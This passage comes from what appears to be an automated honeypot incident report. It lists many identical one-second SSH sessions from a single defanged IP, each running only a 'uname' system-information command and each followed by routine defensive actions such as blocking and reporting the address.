| `2026-07-04 14:58:53` | `cowrie.session.params` |
| `2026-07-04 14:58:53` | `cowrie.command.input` |
| `2026-07-04 14:58:53` | `cowrie.log.closed` |
| `2026-07-04 14:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f32907cfffe

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:55` | `cowrie.session.connect` |
| `2026-07-04 14:58:55` | `cowrie.client.version` |
| `2026-07-04 14:58:55` | `cowrie.client.kex` |
| `2026-07-04 14:58:55` | `cowrie.login.success` |
| `2026-07-04 14:58:56` | `cowrie.session.params` |
| `2026-07-04 14:58:56` | `cowrie.command.input` |
| `2026-07-04 14:58:56` | `cowrie.log.closed` |
| `2026-07-04 14:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df9e0ec56966

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:58` | `cowrie.session.connect` |
| `2026-07-04 14:58:58` | `cowrie.client.version` |
| `2026-07-04 14:58:58` | `cowrie.client.kex` |
| `2026-07-04 14:58:58` | `cowrie.login.success` |
| `2026-07-04 14:58:59` | `cowrie.session.params` |
| `2026-07-04 14:58:59` | `cowrie.command.input` |
| `2026-07-04 14:58:59` | `cowrie.log.closed` |
| `2026-07-04 14:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5141d023ad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:01` | `cowrie.session.connect` |
| `2026-07-04 14:59:01` | `cowrie.client.version` |
| `2026-07-04 14:59:01` | `cowrie.client.kex` |
| `2026-07-04 14:59:02` | `cowrie.login.success` |
| `2026-07-04 14:59:03` | `cowrie.session.params` |
| `2026-07-04 14:59:03` | `cowrie.command.input` |
| `2026-07-04 14:59:03` | `cowrie.log.closed` |
| `2026-07-04 14:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2dcde7ffec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:05` | `cowrie.session.connect` |
| `2026-07-04 14:59:05` | `cowrie.client.version` |
| `2026-07-04 14:59:05` | `cowrie.client.kex` |
| `2026-07-04 14:59:05` | `cowrie.login.success` |
| `2026-07-04 14:59:06` | `cowrie.session.params` |
| `2026-07-04 14:59:06` | `cowrie.command.input` |
| `2026-07-04 14:59:06` | `cowrie.log.closed` |
| `2026-07-04 14:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06cce16d4b1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:08` | `cowrie.session.connect` |
| `2026-07-04 14:59:08` | `cowrie.client.version` |
| `2026-07-04 14:59:08` | `cowrie.client.kex` |
| `2026-07-04 14:59:08` | `cowrie.login.success` |
| `2026-07-04 14:59:09` | `cowrie.session.params` |
| `2026-07-04 14:59:09` | `cowrie.command.input` |
| `2026-07-04 14:59:09` | `cowrie.log.closed` |
| `2026-07-04 14:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6ba9271307

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:11` | `cowrie.session.connect` |
| `2026-07-04 14:59:11` | `cowrie.client.version` |
| `2026-07-04 14:59:11` | `cowrie.client.kex` |
| `2026-07-04 14:59:12` | `cowrie.login.success` |
| `2026-07-04 14:59:12` | `cowrie.session.params` |
| `2026-07-04 14:59:12` | `cowrie.command.input` |
| `2026-07-04 14:59:12` | `cowrie.log.closed` |
| `2026-07-04 14:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5b6aefeaed

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:15` | `cowrie.session.connect` |
| `2026-07-04 14:59:15` | `cowrie.client.version` |
| `2026-07-04 14:59:15` | `cowrie.client.kex` |
| `2026-07-04 14:59:15` | `cowrie.login.success` |
| `2026-07-04 14:59:16` | `cowrie.session.params` |
| `2026-07-04 14:59:16` | `cowrie.command.input` |
| `2026-07-04 14:59:16` | `cowrie.log.closed` |
| `2026-07-04 14:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7eec1c965db

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:18` | `cowrie.session.connect` |
| `2026-07-04 14:59:18` | `cowrie.client.version` |
| `2026-07-04 14:59:18` | `cowrie.client.kex` |
| `2026-07-04 14:59:18` | `cowrie.login.success` |
| `2026-07-04 14:59:19` | `cowrie.session.params` |
| `2026-07-04 14:59:19` | `cowrie.command.input` |
| `2026-07-04 14:59:19` | `cowrie.log.closed` |
| `2026-07-04 14:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae12b22189bf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:21` | `cowrie.session.connect` |
| `2026-07-04 14:59:21` | `cowrie.client.version` |
| `2026-07-04 14:59:21` | `cowrie.client.kex` |
| `2026-07-04 14:59:21` | `cowrie.login.success` |
| `2026-07-04 14:59:22` | `cowrie.session.params` |
| `2026-07-04 14:59:22` | `cowrie.command.input` |
| `2026-07-04 14:59:22` | `cowrie.log.closed` |
| `2026-07-04 14:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687be9d8bf79

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:24` | `cowrie.session.connect` |
| `2026-07-04 14:59:24` | `cowrie.client.version` |
| `2026-07-04 14:59:24` | `cowrie.client.kex` |
| `2026-07-04 14:59:24` | `cowrie.login.success` |
| `2026-07-04 14:59:25` | `cowrie.session.params` |
| `2026-07-04 14:59:25` | `cowrie.command.input` |
| `2026-07-04 14:59:25` | `cowrie.log.closed` |
| `2026-07-04 14:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45fd44ea444

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:27` | `cowrie.session.connect` |
| `2026-07-04 14:59:27` | `cowrie.client.version` |
| `2026-07-04 14:59:28` | `cowrie.client.kex` |
| `2026-07-04 14:59:28` | `cowrie.login.success` |
| `2026-07-04 14:59:29` | `cowrie.session.params` |
| `2026-07-04 14:59:29` | `cowrie.command.input` |
| `2026-07-04 14:59:29` | `cowrie.log.closed` |
| `2026-07-04 14:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadfffb166c5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:31` | `cowrie.session.connect` |
| `2026-07-04 14:59:31` | `cowrie.client.version` |
| `2026-07-04 14:59:31` | `cowrie.client.kex` |
| `2026-07-04 14:59:31` | `cowrie.login.success` |
| `2026-07-04 14:59:32` | `cowrie.session.params` |
| `2026-07-04 14:59:32` | `cowrie.command.input` |
| `2026-07-04 14:59:32` | `cowrie.log.closed` |
| `2026-07-04 14:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17df428481bd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:34` | `cowrie.session.connect` |
| `2026-07-04 14:59:34` | `cowrie.client.version` |
| `2026-07-04 14:59:34` | `cowrie.client.kex` |
| `2026-07-04 14:59:34` | `cowrie.login.success` |
| `2026-07-04 14:59:35` | `cowrie.session.params` |
| `2026-07-04 14:59:35` | `cowrie.command.input` |
| `2026-07-04 14:59:35` | `cowrie.log.closed` |
| `2026-07-04 14:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0c12e3f008

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:37` | `cowrie.session.connect` |
| `2026-07-04 14:59:37` | `cowrie.client.version` |
| `2026-07-04 14:59:37` | `cowrie.client.kex` |
| `2026-07-04 14:59:38` | `cowrie.login.success` |
| `2026-07-04 14:59:38` | `cowrie.session.params` |
| `2026-07-04 14:59:38` | `cowrie.command.input` |
| `2026-07-04 14:59:38` | `cowrie.log.closed` |
| `2026-07-04 14:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89afd27bcd72

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:41` | `cowrie.session.connect` |
| `2026-07-04 14:59:41` | `cowrie.client.version` |
| `2026-07-04 14:59:41` | `cowrie.client.kex` |
| `2026-07-04 14:59:41` | `cowrie.login.success` |
| `2026-07-04 14:59:42` | `cowrie.session.params` |
| `2026-07-04 14:59:42` | `cowrie.command.input` |
| `2026-07-04 14:59:42` | `cowrie.log.closed` |
| `2026-07-04 14:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07681236e963

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:44` | `cowrie.session.connect` |
| `2026-07-04 14:59:44` | `cowrie.client.version` |
| `2026-07-04 14:59:44` | `cowrie.client.kex` |
| `2026-07-04 14:59:44` | `cowrie.login.success` |
| `2026-07-04 14:59:45` | `cowrie.session.params` |
| `2026-07-04 14:59:45` | `cowrie.command.input` |
| `2026-07-04 14:59:45` | `cowrie.log.closed` |
| `2026-07-04 14:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab98790f075

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:47` | `cowrie.session.connect` |
| `2026-07-04 14:59:47` | `cowrie.client.version` |
| `2026-07-04 14:59:47` | `cowrie.client.kex` |
| `2026-07-04 14:59:47` | `cowrie.login.success` |
| `2026-07-04 14:59:48` | `cowrie.session.params` |
| `2026-07-04 14:59:48` | `cowrie.command.input` |
| `2026-07-04 14:59:48` | `cowrie.log.closed` |
| `2026-07-04 14:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2159b3097e95

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:50` | `cowrie.session.connect` |
| `2026-07-04 14:59:50` | `cowrie.client.version` |
| `2026-07-04 14:59:50` | `cowrie.client.kex` |
| `2026-07-04 14:59:51` | `cowrie.login.success` |
| `2026-07-04 14:59:52` | `cowrie.session.params` |
| `2026-07-04 14:59:52` | `cowrie.command.input` |
| `2026-07-04 14:59:52` | `cowrie.log.closed` |
| `2026-07-04 14:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bf3f526290

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:53` | `cowrie.session.connect` |
| `2026-07-04 14:59:53` | `cowrie.client.version` |
| `2026-07-04 14:59:54` | `cowrie.client.kex` |
| `2026-07-04 14:59:54` | `cowrie.login.success` |
| `2026-07-04 14:59:54` | `cowrie.session.params` |
| `2026-07-04 14:59:54` | `cowrie.command.input` |
| `2026-07-04 14:59:55` | `cowrie.log.closed` |
| `2026-07-04 14:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983474e95d70

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:59 |
| **Last Seen** | 2026-07-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:59:57` | `cowrie.session.connect` |
| `2026-07-04 14:59:57` | `cowrie.client.version` |
| `2026-07-04 14:59:57` | `cowrie.client.kex` |
| `2026-07-04 14:59:57` | `cowrie.login.success` |
| `2026-07-04 14:59:58` | `cowrie.session.params` |
| `2026-07-04 14:59:58` | `cowrie.command.input` |
| `2026-07-04 14:59:58` | `cowrie.log.closed` |
| `2026-07-04 14:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbda0765e89c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:00` | `cowrie.session.connect` |
| `2026-07-04 15:00:00` | `cowrie.client.version` |
| `2026-07-04 15:00:00` | `cowrie.client.kex` |
| `2026-07-04 15:00:00` | `cowrie.login.success` |
| `2026-07-04 15:00:01` | `cowrie.session.params` |
| `2026-07-04 15:00:01` | `cowrie.command.input` |
| `2026-07-04 15:00:01` | `cowrie.log.closed` |
| `2026-07-04 15:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e184758102

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:03` | `cowrie.session.connect` |
| `2026-07-04 15:00:03` | `cowrie.client.version` |
| `2026-07-04 15:00:04` | `cowrie.client.kex` |
| `2026-07-04 15:00:04` | `cowrie.login.success` |
| `2026-07-04 15:00:04` | `cowrie.session.params` |
| `2026-07-04 15:00:04` | `cowrie.command.input` |
| `2026-07-04 15:00:05` | `cowrie.log.closed` |
| `2026-07-04 15:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9af9443f74b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:07` | `cowrie.session.connect` |
| `2026-07-04 15:00:07` | `cowrie.client.version` |
| `2026-07-04 15:00:07` | `cowrie.client.kex` |
| `2026-07-04 15:00:07` | `cowrie.login.success` |
| `2026-07-04 15:00:08` | `cowrie.session.params` |
| `2026-07-04 15:00:08` | `cowrie.command.input` |
| `2026-07-04 15:00:08` | `cowrie.log.closed` |
| `2026-07-04 15:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53ef36c66a7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:10` | `cowrie.session.connect` |
| `2026-07-04 15:00:10` | `cowrie.client.version` |
| `2026-07-04 15:00:10` | `cowrie.client.kex` |
| `2026-07-04 15:00:11` | `cowrie.login.success` |
| `2026-07-04 15:00:11` | `cowrie.session.params` |
| `2026-07-04 15:00:11` | `cowrie.command.input` |
| `2026-07-04 15:00:12` | `cowrie.log.closed` |
| `2026-07-04 15:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9c911e76ac

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:14` | `cowrie.session.connect` |
| `2026-07-04 15:00:14` | `cowrie.client.version` |
| `2026-07-04 15:00:14` | `cowrie.client.kex` |
| `2026-07-04 15:00:14` | `cowrie.login.success` |
| `2026-07-04 15:00:15` | `cowrie.session.params` |
| `2026-07-04 15:00:15` | `cowrie.command.input` |
| `2026-07-04 15:00:15` | `cowrie.log.closed` |
| `2026-07-04 15:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-926d07d6c1ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
